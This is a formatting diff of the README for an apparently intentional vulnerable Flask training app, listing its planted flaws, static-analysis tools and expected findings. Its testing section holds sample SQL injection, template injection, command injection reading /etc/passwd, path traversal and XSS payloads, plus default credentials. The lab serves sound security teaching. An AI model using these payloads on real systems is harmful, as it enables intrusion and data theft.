@@ -1,11 +1,16 @@
 # Vulnerable Flask Demo Application
 
-⚠️ **WARNING: This application contains intentional security vulnerabilities for educational purposes only!**
+⚠️ **WARNING: This application contains intentional security vulnerabilities for
+educational purposes only!**
 
 ## Overview
-This Flask application demonstrates Python web application security vulnerabilities. It's specifically designed for cybersecurity education and static analysis training using Python security tools.
+
+This Flask application demonstrates Python web application security
+vulnerabilities. It's specifically designed for cybersecurity education and
+static analysis training using Python security tools.
 
 ## Technology Stack
+
 - **Backend:** Python Flask
 - **Database:** SQLite3
 - **Template Engine:** Jinja2 (with unsafe configurations)
@@ -15,17 +20,20 @@ This Flask application demonstrates Python web application security vulnerabilit
 ## Security Vulnerabilities Included
 
 ### 🔴 Critical Vulnerabilities
+
 1. **SQL Injection** - String concatenation in queries
 2. **Server-Side Template Injection (SSTI)** - Unsafe Jinja2 rendering
 3. **Command Injection** - Direct shell command execution
 4. **Insecure Deserialization** - Pickle unpickling user data
 
 ### 🟡 High Severity Issues
+
 5. **Cross-Site Scripting (XSS)** - Unescaped user input
 6. **Path Traversal** - Direct file system access
 7. **Weak Cryptographic Practices** - MD5 password hashing
 
 ### 🟠 Medium Severity Issues
+
 8. **Missing Authorization** - Unprotected admin endpoints
 9. **Information Disclosure** - Debug and API endpoints
 10. **Insecure Direct Object References** - User profile access
@@ -46,43 +54,53 @@ python app.py
 ## Testing Vulnerabilities
 
 ### SQL Injection (Login)
+
 ```
 Username: admin' OR '1'='1' --
 Password: anything
 ```
 
 ### SQL Injection (Search)
+
 ```
 Search: ' UNION SELECT password,email,role FROM users --
 ```
 
 ### Server-Side Template Injection
+
 ```
 Post Content: {{ 7*7 }}
 Post Content: {{ ''.__class__.__mro__[1].__subclasses__() }}
 ```
 
 ### Command Injection (Ping)
+
 ```
 Host: 127.0.0.1; cat /etc/passwd
 Host: 127.0.0.1 && python -c "import os; os.system('whoami')"
 ```
 
 ### Path Traversal
+
 ```
 GET /read_file?filename=../app.py
 GET /read_file?filename=../../../etc/passwd
 ```
 
 ### XSS
+
 ```html
-Post Content: <script>alert('XSS in Flask!')</script>
+Post Content:
+<script>
+  alert("XSS in Flask!");
+</script>
 Post Content: <img src=x onerror=alert('XSS')>
 ```
 
 ## Python Security Analysis
 
 ### Static Analysis Tools
+
 ```bash
 # Python security linter
 bandit -r . -f json
@@ -98,6 +116,7 @@ semgrep --config=security.audit.dangerous-pickle-use .
 ```
 
 ### Code Quality Analysis
+
 ```bash
 # Python code quality
 flake8 app.py
@@ -112,6 +131,7 @@ pylint --load-plugins=pylint_flask app.py
 ## Educational Objectives
 
 Students will learn to:
+
 1. Identify Python-specific security issues
 2. Understand template injection vulnerabilities
 3. Recognize insecure deserialization risks
@@ -119,6 +139,7 @@ Students will learn to:
 5. Implement secure coding practices in Flask
 
 ## Default Credentials
+
 - **Admin:** admin / admin123
 - **User:** user / user123
 
@@ -142,6 +163,7 @@ Students will learn to:
 ## Security Analysis Results
 
 ### Expected Bandit Findings
+
 - High: Use of MD5 hash
 - High: SQL string formatting
 - High: Use of pickle
@@ -149,16 +171,19 @@ Students will learn to:
 - Low: Debug mode enabled
 
 ### Expected Safety Findings
+
 - Outdated Flask version (if using older version)
 - Known vulnerabilities in dependencies
 
 ### Expected Semgrep Findings
+
 - SQL injection patterns
 - Command injection patterns
 - Template injection risks
 - Pickle deserialization issues
 
 ## File Structure
+
 ```
 vulnerable-flask-app/
 ├── app.py              # Main Flask application
@@ -170,6 +195,7 @@ vulnerable-flask-app/
 ```
 
 ## Database Schema
+
 ```sql
 -- Users table
 CREATE TABLE users (
@@ -181,7 +207,7 @@ CREATE TABLE users (
     api_key TEXT
 );
 
--- Posts table  
+-- Posts table
 CREATE TABLE posts (
     id INTEGER PRIMARY KEY AUTOINCREMENT,
     title TEXT NOT NULL,
@@ -192,6 +218,7 @@ CREATE TABLE posts (
 ```
 
 ## Safety Reminders
+
 - Designed for educational use only
 - Contains intentionally vulnerable code
 - Never use in production environments
